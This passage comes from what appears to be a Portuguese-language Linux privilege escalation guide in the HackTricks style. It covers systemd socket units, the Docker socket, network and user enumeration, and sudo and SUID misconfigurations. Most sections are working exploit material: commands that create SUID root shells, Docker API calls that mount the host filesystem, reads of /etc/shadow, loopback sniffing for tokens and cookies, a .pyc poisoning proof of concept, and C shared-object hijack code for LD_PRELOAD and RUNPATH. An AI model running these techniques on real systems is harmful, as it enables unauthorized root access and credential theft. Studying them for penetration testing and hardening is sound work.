- `ExecStartPre`, `ExecStartPost`: Aceitam uma ou mais linhas de comando, que são **executadas antes** ou **depois** de os **sockets**/FIFOs de escuta serem **criados** e associados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido pelos argumentos do processo.
- `ExecStopPre`, `ExecStopPost`: **Comandos** adicionais que são **executados antes** ou **depois** de os **sockets**/FIFOs de escuta serem **fechados** e removidos, respectivamente.
- `Service`: Especifica o nome da unit de **serviço** **a ser ativada** ao ocorrer **tráfego de entrada**. Essa configuração só é permitida para sockets com Accept=no. Por padrão, é usado o serviço que possui o mesmo nome do socket (com o sufixo substituído). Na maioria dos casos, não deve ser necessário usar essa opção.

### Arquivos .socket graváveis

Se você encontrar um arquivo `.socket` **gravável**, poderá **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor`, e o backdoor será executado antes de o socket ser criado. Portanto, você **provavelmente precisará esperar até que a máquina seja reinicializada.**\
_Observe que o sistema precisa estar usando a configuração desse arquivo de socket, caso contrário o backdoor não será executado_

### Ativação de socket + caminho de unit gravável (criar serviço ausente)

Outra misconfiguration de alto impacto é:

- uma unit de socket com `Accept=no` e `Service=<name>.service`
- a unit de serviço referenciada está ausente
- um atacante pode escrever em `/etc/systemd/system` (ou em outro caminho de busca de units)

Nesse caso, o atacante pode criar `<name>.service` e, em seguida, enviar tráfego para o socket para que o systemd carregue e execute o novo serviço como root.

Fluxo rápido:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets graváveis

Se você **identificar qualquer socket gravável** (_agora estamos falando de Unix Sockets, e não dos arquivos de configuração `.socket`_), então **pode se comunicar** com esse socket e talvez explorar uma vulnerabilidade.

### Enumerar Unix Sockets
```bash
netstat -a -p --unix
```
### Conexão bruta
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemplo de exploração:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Sockets HTTP

Observe que pode haver alguns **sockets escutando por requisições HTTP** (_não estou falando de arquivos .socket, mas dos arquivos que atuam como sockets Unix_). Você pode verificar isso com:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Se o socket **responder com uma** requisição **HTTP**, então você poderá **se comunicar** com ele e talvez **explorar alguma vulnerabilidade**.

### Docker Socket com Permissão de Escrita

O Docker socket, geralmente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele pode ser gravado pelo usuário `root` e pelos membros do grupo `docker`. Ter acesso de gravação a esse socket pode levar à escalação de privilégios. Veja a seguir como isso pode ser feito e métodos alternativos caso o Docker CLI não esteja disponível.

#### **Escalação de Privilégios com o Docker CLI**

Se você tiver acesso de gravação ao Docker socket, poderá escalar privilégios usando os seguintes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Esses comandos permitem executar um container com acesso de root ao sistema de arquivos do host.

#### **Using Docker API Directly**

Nos casos em que a Docker CLI não está disponível, o Docker socket ainda pode ser manipulado usando a Docker API e comandos `curl`.

1.  **List Docker Images:** Recupere a lista de imagens disponíveis.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envie uma requisição para criar um container que monte o diretório raiz do sistema host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Inicie o container recém-criado:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` para estabelecer uma conexão com o container, permitindo a execução de comandos dentro dele.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Após configurar a conexão com `socat`, você poderá executar comandos diretamente no container com acesso de root ao sistema de arquivos do host.

### Outros

Observe que, se você tiver permissões de escrita no Docker socket por estar **dentro do grupo `docker`**, existem [**mais formas de escalar privilégios**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Se a [**Docker API estiver escutando em uma porta**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), você também poderá comprometê-la.

Confira **mais formas de escapar de containers ou abusar de container runtimes para escalar privilégios** em:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Escalação de privilégios com Containerd (ctr)

Se você descobrir que pode usar o comando **`ctr`**, leia a página a seguir, pois **pode ser possível abusar dele para escalar privilégios**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Escalação de privilégios com **RunC**

Se você descobrir que pode usar o comando **`runc`**, leia a página a seguir, pois **pode ser possível abusar dele para escalar privilégios**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus é um sofisticado **sistema de comunicação entre processos (IPC)** que permite que aplicações interajam e compartilhem dados de forma eficiente. Projetado pensando no sistema Linux moderno, ele oferece uma estrutura robusta para diferentes formas de comunicação entre aplicações.

O sistema é versátil e oferece suporte a IPC básico, aprimorando a troca de dados entre processos, de forma semelhante a **UNIX domain sockets aprimorados**. Além disso, ele auxilia na transmissão de eventos ou sinais, promovendo uma integração contínua entre os componentes do sistema. Por exemplo, um sinal de um daemon Bluetooth sobre uma chamada recebida pode fazer com que um music player seja silenciado, melhorando a experiência do usuário. O D-Bus também oferece suporte a um sistema de objetos remotos, simplificando solicitações de serviço e invocações de métodos entre aplicações, agilizando processos que tradicionalmente eram complexos.

O D-Bus opera com base em um **modelo de permissão/negação**, gerenciando permissões de mensagens (chamadas de métodos, emissões de sinais etc.) com base no efeito cumulativo das regras de política correspondentes. Essas políticas especificam as interações com o bus e podem permitir a escalação de privilégios por meio da exploração dessas permissões.

Um exemplo desse tipo de política em `/etc/dbus-1/system.d/wpa_supplicant.conf` é apresentado, detalhando as permissões do usuário root para possuir, enviar e receber mensagens de `fi.w1.wpa_supplicant1`.

Políticas sem um usuário ou grupo especificado aplicam-se universalmente, enquanto as políticas de contexto "default" aplicam-se a todos os casos não abrangidos por outras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprenda a enumerar e explorar uma comunicação D-Bus aqui:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rede**

É sempre interessante enumerar a rede e descobrir a posição da máquina.

### Enumeração genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Triagem rápida de filtragem de saída

Se o host consegue executar comandos, mas os callbacks falham, diferencie rapidamente a filtragem de DNS, transporte, proxy e rota:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Portas abertas

Sempre verifique os serviços de rede em execução na máquina com os quais você não conseguiu interagir antes de acessá-la:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classifique os listeners pelo destino do bind:

- `0.0.0.0` / `[::]`: expostos em todas as interfaces locais.
- `127.0.0.1` / `::1`: disponíveis apenas localmente (bons candidatos para tunnel/forward).
- IPs internos específicos (por exemplo, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): geralmente acessíveis apenas a partir de segmentos internos.

### Fluxo de triagem de serviços disponíveis apenas localmente

Quando você compromete um host, os serviços vinculados a `127.0.0.1` frequentemente se tornam acessíveis pela primeira vez a partir do seu shell. Um fluxo local rápido é:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS como scanner de rede (modo somente-rede)

Além das verificações locais de PE, o linPEAS pode ser executado como um scanner de rede focado. Ele usa binários disponíveis em `$PATH` (normalmente `fping`, `ping`, `nc`, `ncat`) e não instala ferramentas.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Se você passar `-d`, `-p` ou `-i` sem `-t`, o linPEAS funcionará como um scanner de rede puro (ignorando o restante das verificações de privilege-escalation).

### Sniffing

Verifique se você consegue capturar tráfego. Se conseguir, poderá obter algumas credenciais.
```
timeout 1 tcpdump
```
Verificações práticas rápidas:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) é especialmente valioso em post-exploitation porque muitos serviços acessíveis apenas internamente expõem tokens/cookies/credentials nesse endereço:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture agora, analise depois:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Usuários

### Enumeração genérica

Verifique **quem** você é, quais **privilégios** possui, quais **usuários** estão no sistema, quais podem **fazer login** e quais têm **privilégios de root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Algumas versões do Linux foram afetadas por um bug que permite que usuários com **UID > INT_MAX** escalem privilégios. Mais informações: [aqui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aqui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [aqui](https://twitter.com/paragonsec/status/1071152249529884674).\
**Explore-o** usando: **`systemd-run -t /bin/bash`**

### Grupos

Verifique se você é **membro de algum grupo** que possa conceder privilégios de root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Área de transferência

Verifique se há algo interessante localizado dentro da área de transferência (se possível)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Senhas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

Se você **conhece alguma senha** do ambiente, **tente fazer login como cada usuário** usando essa senha.

### Su Brute

Se não se importar em gerar muito ruído e os binários `su` e `timeout` estiverem presentes no computador, você pode tentar fazer brute-force de usuários usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
O [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta fazer brute-force de usuários.

## Abusos de PATH com permissão de escrita

### $PATH

Se você descobrir que pode **escrever dentro de alguma pasta do $PATH**, talvez consiga escalar privilégios **criando um backdoor dentro da pasta com permissão de escrita**, usando o nome de algum comando que será executado por um usuário diferente (idealmente root) e que **não seja carregado de uma pasta localizada anteriormente à sua pasta com permissão de escrita no $PATH**.

### SUDO e SUID

Você pode ter permissão para executar algum comando usando sudo, ou o comando pode ter o bit suid definido. Verifique usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alguns **comandos inesperados permitem ler e/ou gravar arquivos ou até mesmo executar um comando.** Por exemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

A configuração do Sudo pode permitir que um usuário execute algum comando com os privilégios de outro usuário sem saber a senha.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Neste exemplo, o usuário `demo` pode executar `vim` como `root`; agora é trivial obter um shell adicionando uma chave SSH ao diretório do root ou chamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta diretiva permite que o usuário **defina uma variável de ambiente** ao executar algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este exemplo, **baseado na máquina Admirer do HTB**, era **vulnerável** a **PYTHONPATH hijacking** para carregar uma biblioteca Python arbitrária ao executar o script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning em imports Python permitidos pelo sudo

Se um **script Python permitido pelo sudo** importar um módulo cujo diretório do pacote contenha um **`__pycache__` gravável**, talvez seja possível substituir o `.pyc` em cache e obter execução de código como o usuário privilegiado na próxima importação.

- Por que funciona:
- O CPython armazena caches de bytecode em `__pycache__/module.cpython-<ver>.pyc`.
- O interpretador valida o **cabeçalho** (magic + metadados de timestamp/hash vinculados ao código-fonte) e, em seguida, executa o objeto de código marshalizado armazenado depois desse cabeçalho.
- Se você puder **excluir e recriar** o arquivo em cache porque o diretório é gravável, um `.pyc` pertencente ao root, mas não gravável, ainda poderá ser substituído.
- Caminho típico:
- `sudo -l` mostra um script ou wrapper Python que você pode executar como root.
- Esse script importa um módulo local de `/opt/app/`, `/usr/local/lib/...`, etc.
- O diretório `__pycache__` do módulo importado é gravável pelo seu usuário ou por todos.

Enumeração rápida:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Se você puder inspecionar o script privilegiado, identifique os módulos importados e o caminho do cache:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Fluxo de abuso:

1. Execute o script permitido pelo sudo uma vez para que o Python crie o arquivo de cache legítimo, caso ele ainda não exista.
2. Leia os primeiros 16 bytes do `.pyc` legítimo e reutilize-os no arquivo envenenado.
3. Compile um objeto de código de payload, use `marshal.dumps(...)` nele, exclua o arquivo de cache original e recrie-o com o cabeçalho original seguido do seu bytecode malicioso.
4. Execute novamente o script permitido pelo sudo para que o import execute seu payload como root.

Observações importantes:

- Reutilizar o cabeçalho original é essencial porque o Python verifica os metadados do cache em relação ao arquivo-fonte, não se o corpo do bytecode realmente corresponde ao código-fonte.
- Isso é especialmente útil quando o arquivo-fonte pertence ao root e não pode ser gravado, mas o diretório `__pycache__` que o contém pode ser gravado.
- O ataque falha se o processo privilegiado usar `PYTHONDONTWRITEBYTECODE=1`, fizer imports de um local com permissões seguras ou remover o acesso de gravação de todos os diretórios no caminho de import.

Formato mínimo de proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Garanta que nenhum diretório no caminho de importação do Python com privilégios possa ser gravado por usuários com poucos privilégios, incluindo `__pycache__`.
- Para execuções privilegiadas, considere `PYTHONDONTWRITEBYTECODE=1` e verificações periódicas em busca de diretórios `__pycache__` graváveis inesperados.
- Trate módulos Python locais graváveis e diretórios de cache graváveis da mesma forma que trataria scripts shell ou bibliotecas compartilhadas graváveis executados pelo root.

### BASH_ENV preservado via sudo env_keep → shell root

Se o sudoers preservar `BASH_ENV` (por exemplo, `Defaults env_keep+="ENV BASH_ENV"`), você poderá aproveitar o comportamento de inicialização não interativa do Bash para executar código arbitrário como root ao invocar um comando permitido.

- Por que funciona: em shells não interativos, o Bash avalia `$BASH_ENV` e faz o source desse arquivo antes de executar o script-alvo. Muitas regras do sudo permitem executar um script ou um shell wrapper. Se `BASH_ENV` for preservado pelo sudo, seu arquivo será carregado com privilégios de root.

- Requisitos:
- Uma regra do sudo que você possa executar (qualquer alvo que invoque `/bin/bash` de forma não interativa ou qualquer bash script).
- `BASH_ENV` presente em `env_keep` (verifique com `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Endurecimento:
- Remova `BASH_ENV` (e `ENV`) de `env_keep`; prefira `env_reset`.
- Evite shell wrappers para comandos permitidos pelo sudo; use binários mínimos.
- Considere o registro de I/O do sudo e alertas quando variáveis de ambiente preservadas forem usadas.

### Terraform via sudo com HOME preservado (!env_reset)

Se o sudo deixar o ambiente intacto (`!env_reset`) ao permitir `terraform apply`, `$HOME` permanecerá como o do usuário que chamou o comando. Portanto, o Terraform carregará **$HOME/.terraformrc** como root e respeitará `provider_installation.dev_overrides`.

- Aponte o provider necessário para um diretório gravável e coloque um plugin malicioso com o nome do provider (por exemplo, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
O Terraform falhará no handshake do plugin Go, mas executará o payload como root antes de morrer, deixando um shell SUID para trás.

### Substituições de TF_VAR + bypass da validação de symlink

As variáveis do Terraform podem ser fornecidas por meio de variáveis de ambiente `TF_VAR_<name>`, que permanecem disponíveis quando o sudo preserva o ambiente. Validações fracas, como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, podem ser contornadas com symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
O Terraform resolve o symlink e copia o `/root/root.txt` real para um destino legível pelo atacante. A mesma abordagem pode ser usada para **escrever** em caminhos privilegiados, criando antecipadamente symlinks no destino (por exemplo, apontando o caminho de destino do provider para dentro de `/etc/cron.d/`).

### requiretty / !requiretty

Em algumas distribuições mais antigas, o sudo pode ser configurado com `requiretty`, o que força o sudo a ser executado somente a partir de um TTY interativo. Se `!requiretty` estiver definido (ou se a opção estiver ausente), o sudo poderá ser executado a partir de contextos não interativos, como reverse shells, cron jobs ou scripts.
```bash
Defaults !requiretty
```
Isso não é uma vulnerabilidade direta por si só, mas amplia as situações em que as regras do sudo podem ser abusadas sem precisar de uma PTY completa.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Se `sudo -l` mostrar `env_keep+=PATH` ou um `secure_path` contendo entradas graváveis pelo atacante (por exemplo, `/home/<user>/bin`), qualquer comando relativo dentro do alvo permitido pelo sudo pode ser sobrescrito.

- Requisitos: uma regra do sudo (geralmente `NOPASSWD`) executando um script/binário que chama comandos sem caminhos absolutos (`free`, `df`, `ps`, etc.) e uma entrada gravável do PATH que seja pesquisada primeiro.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Contornando caminhos na execução do Sudo
**Jump** para ler outros arquivos ou usar **symlinks**. Por exemplo, no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se um **wildcard** for usado (\*), é ainda mais fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sem o caminho do comando

Se a **permissão sudo** for concedida a um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_, você pode explorá-la alterando a variável PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Essa técnica também pode ser usada se um binário **suid** **executar outro comando sem especificar o caminho para ele (sempre verifique com** _**strings**_ **o conteúdo de um binário SUID suspeito)**.

[Exemplos de Payloads para executar.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binário SUID com caminho do comando

Se o binário **suid** **executar outro comando especificando o caminho**, você poderá tentar **exportar uma função** nomeada como o comando que o arquivo suid está chamando.

Por exemplo, se um binário suid chamar _**/usr/sbin/service apache2 start**_, você deverá tentar criar a função e exportá-la:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Então, quando você chamar o binary suid, esta função será executada

### Script gravado executado por um wrapper SUID

Uma misconfiguration comum em custom-apps é um wrapper binary SUID pertencente ao root que executa um script, enquanto o próprio script pode ser gravado por usuários de baixo privilégio.

Padrão típico:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Se `/usr/local/bin/backup.sh` tiver permissões de escrita, você pode anexar comandos de payload e então executar o wrapper SUID:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Verificações rápidas:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Este caminho de ataque é especialmente comum em wrappers de "maintenance"/"backup" incluídos em `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

A variável de ambiente **LD_PRELOAD** é usada para especificar uma ou mais bibliotecas compartilhadas (arquivos .so) a serem carregadas pelo loader antes de todas as outras, incluindo a biblioteca C padrão (`libc.so`). Esse processo é conhecido como preloading de uma biblioteca.

No entanto, para manter a segurança do sistema e impedir que esse recurso seja explorado, especialmente com executáveis **suid/sgid**, o sistema impõe determinadas condições:

- O loader ignora **LD_PRELOAD** para executáveis nos quais o ID de usuário real (_ruid_) não corresponde ao ID de usuário efetivo (_euid_).
- Para executáveis com suid/sgid, somente bibliotecas em caminhos padrão que também sejam suid/sgid são carregadas previamente.

A privilege escalation pode ocorrer se você tiver a capacidade de executar comandos com `sudo` e a saída de `sudo -l` incluir a instrução **env_keep+=LD_PRELOAD**. Essa configuração permite que a variável de ambiente **LD_PRELOAD** persista e seja reconhecida mesmo quando os comandos são executados com `sudo`, podendo levar à execução de código arbitrário com privilégios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Salve como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Em seguida, **compile-o** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **escale privilégios** executando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Um privesc semelhante pode ser explorado se o atacante controlar a variável de ambiente **LD_LIBRARY_PATH**, pois ele controla o caminho onde as bibliotecas serão procuradas.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Ao encontrar um binário com permissões **SUID** que pareça incomum, é uma boa prática verificar se ele está carregando arquivos **.so** corretamente. Isso pode ser verificado executando o seguinte comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por exemplo, ao encontrar um erro como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_, isso sugere um potencial de exploração.

Para explorá-lo, seria necessário criar um arquivo C, por exemplo _"/path/to/.config/libcalc.c"_, contendo o seguinte código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, depois de compilado e executado, busca elevar os privilégios manipulando as permissões do arquivo e executando um shell com privilégios elevados.

Compile o arquivo C acima em um arquivo de objeto compartilhado (.so) com:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Por fim, executar o binário SUID afetado deve acionar o exploit, possibilitando um possível comprometimento do sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Agora que encontramos um binário SUID carregando uma biblioteca de uma pasta onde podemos escrever, vamos criar a biblioteca nessa pasta com o nome necessário:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se você obtiver um erro como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
